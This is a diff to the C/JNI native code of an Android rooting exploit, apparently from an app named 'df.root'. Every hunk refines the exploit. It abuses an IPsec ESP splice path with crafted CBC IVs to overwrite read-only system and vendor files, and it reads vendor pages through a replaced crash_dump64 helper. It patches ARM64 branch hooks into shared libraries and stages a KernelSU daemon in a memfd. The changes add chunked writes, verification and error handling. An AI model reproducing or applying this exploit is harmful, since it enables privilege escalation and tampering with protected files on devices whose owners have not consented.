@@ -24,9 +24,17 @@ static jmethodID report_mid;
 
 JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved __attribute__((unused))) {
     JNIEnv *env;
-    (*vm)->GetEnv(vm, (void **)&env, JNI_VERSION_1_4);
+    if ((*vm)->GetEnv(vm, (void **)&env, JNI_VERSION_1_4) != JNI_OK || env == NULL) {
+        return JNI_ERR;
+    }
     jclass clz = (*env)->FindClass(env, "df/root/IReporter");
+    if (clz == NULL) {
+        return JNI_ERR;
+    }
     report_mid = (*env)->GetMethodID(env, clz, "report", "(Ljava/lang/String;)V");
+    if (report_mid == NULL) {
+        return JNI_ERR;
+    }
     return JNI_VERSION_1_4;
 }
 
@@ -59,7 +67,7 @@ static const char target_lib_path[] = "/vendor/lib64/libbinderdebug.so";
 
 /* SA parameters set by Java via nativeRunAll() before any patching. */
 static int      g_encap_port;
-static int      g_sender_port;
+static int      g_sender_fd = -1;
 static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
 static uint8_t  g_hmac_key[32];
@@ -79,10 +87,13 @@ static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16],
         iv[i] = dec[i] ^ desired[i];
 }
 
-/* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
- * crash_dump64 has been overwritten with splicehelper which supports argv[3]="r".
+/* Read up to len bytes from the vendor file at offset through the crash_dump
+ * bridge (splicehelper "rb" mode). One helper exec per chunk instead of one
+ * per 16-byte block: the .ko patch drops from ~1000 forks to a handful.
  */
-static int read_vendor_content(off_t offset, uint8_t buf[16], struct Reporter *reporter) {
+static int read_vendor_chunk(off_t offset, uint8_t *buf, size_t len,
+                             struct Reporter *reporter) {
+    size_t want = len > 4096 ? 4096 : len;
     int rdpipe[2];
     if (pipe(rdpipe) < 0) { REPORTLN("pipe failed: %s", strerror(errno)); return -1; }
 
@@ -101,38 +112,42 @@ static int read_vendor_content(off_t offset, uint8_t buf[16], struct Reporter *r
             if (dup2(rdpipe[1], 0) < 0) _exit(1);
             close(rdpipe[1]);
         }
-        execl(kCrashDump, "crashdump64", offstr, target_lib_path, "r", NULL);
+        execl(kCrashDump, "crashdump64", offstr, target_lib_path, "rb", NULL);
         _exit(1);
     }
     close(rdpipe[1]);
     int status;
     TEMP_FAILURE_RETRY(waitpid(pid, &status, 0));
-    int n = 0;
-    if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
-        n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
+    size_t got = 0;
+    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
+        while (got < want) {
+            ssize_t n = TEMP_FAILURE_RETRY(read(rdpipe[0], buf + got, want - got));
+            if (n <= 0) break;
+            got += (size_t)n;
+        }
+    }
     close(rdpipe[0]);
-    if (n != 16) {
+    if (got != want) {
         if (WIFEXITED(status))
-            REPORTLN("read_vendor at 0x%lx got %d bytes (exit %d)",
-                     (long)offset, n, WEXITSTATUS(status));
+            REPORTLN("read_vendor at 0x%lx got %zu/%zu (exit %d)",
+                     (long)offset, got, want, WEXITSTATUS(status));
         else if (WIFSIGNALED(status))
-            REPORTLN("read_vendor at 0x%lx got %d bytes (signal %d)",
-                     (long)offset, n, WTERMSIG(status));
+            REPORTLN("read_vendor at 0x%lx got %zu/%zu (signal %d)",
+                     (long)offset, got, want, WTERMSIG(status));
         else
-            REPORTLN("read_vendor at 0x%lx got %d bytes (status 0x%x)",
-                     (long)offset, n, status);
+            REPORTLN("read_vendor at 0x%lx got %zu/%zu (status 0x%x)",
+                     (long)offset, got, want, status);
         return -1;
     }
     return 0;
 }
 
-/* Send one CBC write.
+/* Send one CBC write on the already-connected sender socket.
  * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
  * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
  * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
- * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
  */
-static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
+static int do_one_write_cbc(int file_fd, off_t offset,
                             const uint8_t iv[16], const uint8_t old_content[16],
                             int use_helper, struct Reporter *reporter) {
     int ret = -1;
@@ -156,9 +171,10 @@ static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
     uint8_t hmac_full[32];
     hmac_sha256(g_hmac_key, 32, hmac_msg, 40, hmac_full);
 
-    /* vmsplice header + IV (24 bytes) */
+    /* vmsplice header + IV (24 bytes). No SPLICE_F_GIFT: these are stack
+     * buffers and GIFT hands the page to the kernel permanently. */
     struct iovec iov1 = {.iov_base = hdr, .iov_len = 24};
-    if (vmsplice(pfd[1], &iov1, 1, SPLICE_F_GIFT) != 24) {
+    if (vmsplice(pfd[1], &iov1, 1, 0) != 24) {
         REPORTLN("vmsplice hdr failed: %s", strerror(errno)); goto out_pipe;
     }
 
@@ -188,14 +204,14 @@ static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
 
     /* vmsplice ICV (truncated HMAC) */
     struct iovec iov2 = {.iov_base = hmac_full, .iov_len = (size_t)g_icv_len};
-    if (vmsplice(pfd[1], &iov2, 1, SPLICE_F_GIFT) != g_icv_len) {
+    if (vmsplice(pfd[1], &iov2, 1, 0) != g_icv_len) {
         REPORTLN("vmsplice ICV failed: %s", strerror(errno)); goto out_pipe;
     }
 
     /* splice pipe → UDP: 24 + 16 + icv_len bytes */
     {
         int total = 24 + 16 + g_icv_len;
-        ssize_t s = splice(pfd[0], NULL, sk_send, NULL, total, 0);
+        ssize_t s = splice(pfd[0], NULL, g_sender_fd, NULL, total, 0);
         ret = (s == total) ? 0 : -1;
         if (ret) REPORTLN("splice pipe->udp: %zd expected %d", s, total);
     }
@@ -206,10 +222,10 @@ out_pipe:
 }
 
 /* Patch len bytes of payload into file starting at file offset foff.
- * Writes in 16-byte CBC blocks.
- * For system files (use_helper=0): reads old_content with pread().
- * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
- * len must be a multiple of 16.
+ * Writes in 16-byte CBC blocks, in 4 KB chunks: the old content is read per
+ * chunk (one helper exec for vendor files), written, read back and compared.
+ * A mismatch retries the chunk once before failing. len must be a multiple
+ * of 16.
  */
 static int patch_file_cbc(const char *path, const char *payload, size_t len,
                            size_t foff, int use_helper, struct Reporter *reporter) {
@@ -218,71 +234,80 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
         return -1;
     }
 
-    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sk_send < 0) { REPORTLN("socket failed: %s", strerror(errno)); return -1; }
-    {
-        int opt = 1;
-        setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
-        struct sockaddr_in src = {
-            .sin_family = AF_INET,
-            .sin_port   = htons((uint16_t)g_sender_port),
-            .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
-        };
-        if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
-            REPORTLN("bind port %d failed: %s", g_sender_port, strerror(errno));
-        struct sockaddr_in dst = {
-            .sin_family = AF_INET,
-            .sin_port   = htons((uint16_t)g_encap_port),
-            .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
-        };
-        if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
-            REPORTLN("connect failed: %s", strerror(errno));
-            close(sk_send); return -1;
-        }
-    }
-
     int file_fd = -1;
     if (!use_helper) {
         file_fd = open(path, O_RDONLY);
         if (file_fd < 0) {
             REPORTLN("open %s failed: %s", path, strerror(errno));
-            close(sk_send); return -1;
+            return -1;
         }
     }
 
+    const size_t CHUNK = 4096;
+    uint8_t old_buf[4096];
+    uint8_t verify_buf[4096];
     int rc = 0;
-    for (size_t i = 0; i < len / 16; i++) {
-        off_t off = (off_t)(foff + i * 16);
-        uint8_t old_content[16] = {0};
 
-        if (use_helper) {
-            if (read_vendor_content(off, old_content, reporter) < 0) {
-                rc = -1; break;
+    for (size_t base = 0; base < len; base += CHUNK) {
+        size_t n = len - base;
+        if (n > CHUNK) n = CHUNK;
+
+        int chunk_ok = 0;
+        for (int attempt = 1; attempt <= 2 && !chunk_ok; attempt++) {
+            if (use_helper) {
+                if (read_vendor_chunk((off_t)(foff + base), old_buf, n, reporter) < 0) {
+                    rc = -1;
+                    break;
+                }
+            } else if (pread(file_fd, old_buf, n, (off_t)(foff + base)) != (ssize_t)n) {
+                REPORTLN("pread at 0x%lx failed: %s", (long)(foff + base), strerror(errno));
+                rc = -1;
+                break;
             }
-        } else {
-            if (pread(file_fd, old_content, 16, off) != 16) {
-                REPORTLN("pread at 0x%lx failed: %s", (long)off, strerror(errno));
-                rc = -1; break;
+
+            int write_ok = 1;
+            for (size_t i = 0; i < n; i += 16) {
+                uint8_t desired[16] = {0};
+                memcpy(desired, payload + base + i, 16);
+                uint8_t iv[16];
+                compute_iv(old_buf + i, desired, iv);
+                if (do_one_write_cbc(file_fd, (off_t)(foff + base + i),
+                                     iv, old_buf + i, use_helper, reporter) < 0) {
+                    REPORTLN("write at 0x%lx failed", (long)(foff + base + i));
+                    write_ok = 0;
+                    break;
+                }
+            }
+            if (!write_ok) {
+                rc = -1;
+                break;
+            }
+
+            if (use_helper) {
+                if (read_vendor_chunk((off_t)(foff + base), verify_buf, n, reporter) < 0) {
+                    rc = -1;
+                    break;
+                }
+            } else if (pread(file_fd, verify_buf, n, (off_t)(foff + base)) != (ssize_t)n) {
+                REPORTLN("verify pread at 0x%lx failed", (long)(foff + base));
+                rc = -1;
+                break;
+            }
+            chunk_ok = memcmp(verify_buf, payload + base, n) == 0;
+            if (!chunk_ok) {
+                REPORTLN("verify mismatch at 0x%lx (attempt %d)",
+                         (long)(foff + base), attempt);
             }
         }
-
-        uint8_t desired[16] = {0};
-        memcpy(desired, payload + i * 16, 16);
-
-        uint8_t iv[16];
-        compute_iv(old_content, desired, iv);
-
-        if (do_one_write_cbc(sk_send, file_fd, off, iv, old_content, use_helper, reporter) < 0) {
-            REPORTLN("write #%zu at 0x%lx failed", i, (long)off);
-            rc = -1; break;
+        if (!chunk_ok) {
+            if (rc == 0) rc = -1;
+            break;
         }
-        if (i % 32 == 0)
-            REPORTLN("%zu ...", i * 16);
+        if ((base / CHUNK) % 8 == 0) REPORTLN("%zu ...", base);
     }
 
-    if (!use_helper) close(file_fd);
-    close(sk_send);
-    if (rc == 0) REPORTLN("patched %zu bytes to %s+0x%zx", len, path, foff);
+    if (!use_helper && file_fd >= 0) close(file_fd);
+    if (rc == 0) REPORTLN("patched %zu bytes to %s+0x%zx (verified)", len, path, foff);
     return rc;
 }
 
@@ -481,13 +506,22 @@ static int patch_hook(const char *lib, const char *sym,
 
     const uint32_t BRANCH = 0x14000000;
     uint32_t start_delta = (uint32_t)(stage_start - stage_data);
-    uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);
+    int64_t delta = (int64_t)(shell_off + start_delta) - (int64_t)hook_off;
+    if (delta % 4 != 0 || delta > 0x7fffffcLL || delta < -0x8000000LL) {
+        REPORTLN("%s hook branch out of range: %lld", lib, (long long)delta);
+        return 1;
+    }
+    uint32_t hook_insn = BRANCH | (((uint32_t)delta >> 2) & 0x3ffffff);
 
     if (first_insn == hook_insn) {
         REPORTLN("%s already hooked", lib); return 0;
     }
-    uint32_t jmpback = BRANCH |
-        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
+    int64_t back_delta = (int64_t)(hook_off + 4) - (int64_t)(shell_off + stage_len - 4);
+    if (back_delta % 4 != 0 || back_delta > 0x7fffffcLL || back_delta < -0x8000000LL) {
+        REPORTLN("%s hook return branch out of range: %lld", lib, (long long)back_delta);
+        return 1;
+    }
+    uint32_t jmpback = BRANCH | (((uint32_t)back_delta >> 2) & 0x3ffffff);
     *(uint32_t *)&stage_data[stage_len - 4] = jmpback;
     *(uint32_t *)&first_inst_copy[0] = first_insn;
 
@@ -570,26 +604,55 @@ static int createOrphanProcess(struct Reporter *reporter) {
 static int has_marker(const char *p) { return access(p, F_OK) == 0; }
 
 JNIEXPORT jint JNICALL
-Java_df_root_MainActivity_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused)),
+Java_df_root_Native_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused)),
                                                jobject reporter_obj,
                                                jint encapPort, jint spi,
                                                jbyteArray aesCbcKey,
                                                jbyteArray hmacKey, jint icvLen,
-                                               jint senderPort, jstring jksudPath,
+                                               jint senderFd, jstring jksudPath,
                                                jboolean softReboot) {
+    if (env == NULL || reporter_obj == NULL || aesCbcKey == NULL
+            || hmacKey == NULL || jksudPath == NULL) {
+        return 3;
+    }
+    if ((*env)->GetArrayLength(env, aesCbcKey) < 32
+            || (*env)->GetArrayLength(env, hmacKey) < 32) {
+        return 3;
+    }
+    if (senderFd < 0) {
+        return 3;
+    }
     struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;
 
-    g_encap_port  = (int)encapPort;
-    g_sender_port = (int)senderPort;
-    g_spi         = (uint32_t)spi;
-    g_seq         = 1;
-    g_icv_len     = (int)icvLen;
+    g_encap_port = (int)encapPort;
+    g_sender_fd  = (int)senderFd;
+    g_spi        = (uint32_t)spi;
+    g_seq        = 1;
+    g_icv_len    = (int)icvLen;
+
+    struct sockaddr_in dst = {
+        .sin_family = AF_INET,
+        .sin_port   = htons((uint16_t)g_encap_port),
+        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
+    };
+    if (connect(g_sender_fd, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
+        REPORTLN("connect sender fd failed: %s", strerror(errno));
+        return 3;
+    }
 
     jbyte *kb = (*env)->GetByteArrayElements(env, aesCbcKey, NULL);
+    if (kb == NULL) {
+        REPORTLN("aes key unavailable");
+        return 3;
+    }
     memcpy(g_aes_key, kb, 32);
     (*env)->ReleaseByteArrayElements(env, aesCbcKey, kb, JNI_ABORT);
 
     jbyte *hb = (*env)->GetByteArrayElements(env, hmacKey, NULL);
+    if (hb == NULL) {
+        REPORTLN("hmac key unavailable");
+        return 3;
+    }
     memcpy(g_hmac_key, hb, 32);
     (*env)->ReleaseByteArrayElements(env, hmacKey, hb, JNI_ABORT);
 
@@ -597,29 +660,54 @@ Java_df_root_MainActivity_nativeRunAll(JNIEnv *env, jclass clz __attribute__((un
     int ksud_mfd = -1;
     {
         const char *ksud_path = (*env)->GetStringUTFChars(env, jksudPath, NULL);
+        if (ksud_path == NULL) {
+            REPORTLN("ksud path unavailable");
+            return 3;
+        }
         int src = open(ksud_path, O_RDONLY | O_CLOEXEC);
         (*env)->ReleaseStringUTFChars(env, jksudPath, ksud_path);
-        if (src >= 0) {
-            ksud_mfd = (int)syscall(__NR_memfd_create, "ksud", 0);
-            if (ksud_mfd >= 0) {
-                char buf[4096]; ssize_t n;
-                while ((n = read(src, buf, sizeof(buf))) > 0) {
-                    for (ssize_t w = 0; w < n; ) {
-                        ssize_t r = write(ksud_mfd, buf + w, (size_t)(n - w));
-                        if (r <= 0) break;
-                        w += r;
-                    }
-                }
-                char proc_path[64];
-                snprintf(proc_path, sizeof(proc_path), "/proc/%d/fd/%d",
-                         getpid(), ksud_mfd);
-                strncpy(libc_data + libc_ksud_proc_path_off, proc_path, 63);
-                libc_data[libc_ksud_proc_path_off + 63] = '\0';
-                libc_data[libc_soft_reboot_off] = softReboot ? 1 : 0;
-                REPORTLN("ksud mfd: %s", proc_path);
-            }
-            close(src);
+        if (src < 0) {
+            REPORTLN("open ksud failed: %s", strerror(errno));
+            return 3;
         }
+        struct stat st;
+        if (fstat(src, &st) != 0 || st.st_size <= 0) {
+            REPORTLN("ksud size invalid: %lld", (long long)st.st_size);
+            close(src);
+            return 3;
+        }
+        REPORTLN("ksud: %lld bytes", (long long)st.st_size);
+        ksud_mfd = (int)syscall(__NR_memfd_create, "ksud", 0);
+        if (ksud_mfd < 0) {
+            REPORTLN("memfd_create failed: %s", strerror(errno));
+            close(src);
+            return 3;
+        }
+        int copy_ok = 1;
+        char buf[4096];
+        ssize_t n;
+        while ((n = read(src, buf, sizeof(buf))) > 0) {
+            for (ssize_t w = 0; w < n; ) {
+                ssize_t r = write(ksud_mfd, buf + w, (size_t)(n - w));
+                if (r <= 0) { copy_ok = 0; break; }
+                w += r;
+            }
+            if (!copy_ok) break;
+        }
+        if (n < 0 || !copy_ok) {
+            REPORTLN("ksud copy failed");
+            close(src);
+            close(ksud_mfd);
+            return 3;
+        }
+        close(src);
+        char proc_path[64];
+        snprintf(proc_path, sizeof(proc_path), "/proc/%d/fd/%d",
+                 getpid(), ksud_mfd);
+        strncpy(libc_data + libc_ksud_proc_path_off, proc_path, 63);
+        libc_data[libc_ksud_proc_path_off + 63] = '\0';
+        libc_data[libc_soft_reboot_off] = softReboot ? 1 : 0;
+        REPORTLN("ksud mfd: %s", proc_path);
     }
 
     struct PatchRestore libc_r = {0}, libcxx_r = {0};
